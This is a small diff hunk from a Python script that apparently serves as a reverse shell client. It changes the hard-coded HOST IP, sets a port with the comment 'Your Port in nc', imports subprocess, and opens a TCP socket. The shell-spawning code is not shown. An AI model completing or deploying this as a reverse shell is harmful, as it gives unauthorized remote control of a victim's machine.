@@ -2,7 +2,7 @@ import socket
 import subprocess
 
 # Port and IP 
-HOST = '172.27.113.63'  # Your IP address
+HOST = '192.168.0.1'  # Your IP address
 PORT = 1234 #Your Port in nc
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
